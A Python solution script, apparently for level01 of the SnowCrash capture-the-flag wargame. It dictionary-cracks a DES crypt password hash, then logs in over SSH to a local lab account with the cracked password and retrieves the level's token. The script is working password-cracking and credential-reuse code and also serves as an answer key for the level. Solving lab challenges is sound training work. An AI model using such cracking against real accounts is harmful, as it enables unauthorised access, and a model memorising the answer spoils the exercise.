"""Level01 - DES Hash Cracker with SSH"""

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from passlib.context import CryptContext
from common.utils import ssh_cmd, scp_cmd, read_flag, save_flag

des_ctx = CryptContext(schemes=["des_crypt"], deprecated="auto")


def crack_hash(target, wordlist=None):
    """Crack DES hash using dictionary attack."""
    salt = target[:2]
    common = [
        "abcdefg",
        "password",
        "123456",
        "admin",
        "test",
        "root",
        "flag01",
        "level01",
        "snowcrash",
        "nottoohardhere",
        "qwerty",
        "letmein",
    ]
    print(f"[*] Target: {target} | Salt: {salt}\n")

    for pwd in common:
        try:
            hashed = des_ctx.hash(pwd[:8], salt=salt)
            if hashed == target:
                print(f"[+] FOUND: {pwd}")
                return pwd
        except:
            pass
        print(f"    [-] {pwd}")

    if wordlist:
        print("[*] Wordlist phase...")
        try:
            for line in open(wordlist):
                word = line.strip()[:8]
                if des_ctx.hash(word, salt=salt) == target:
                    print(f"[+] FOUND: {word}")
                    return word
        except:
            pass
    return None


def exploit():
    """Execute hash cracking and retrieve token."""
    password = crack_hash("42hDRfypTqqnw", "/usr/share/dict/words")
    if not password:
        print("[-] Password not found")
        return False, "", ""

    print(f"\n[+] Cracked: {password}\n[*] Connecting to flag01...")
    code, out, _ = ssh_cmd("localhost", 4242, "flag01", password, "getflag")

    if code == 0 and "token" in out.lower():
        print(f"[+] Success!\n{out}")
        return True, out.split(":")[-1].strip(), password
    print("[!] Failed")
    return False, "", ""


def main():
    success, token, password = exploit()
    if success:
        save_flag(1, token)
        print(f"[ANSWER]\n  Flag01 Password: {password}\n  Level01 Token: {token}")
    else:
        print("[!] Exploit failed")
        sys.exit(1)


if __name__ == "__main__":
    main()
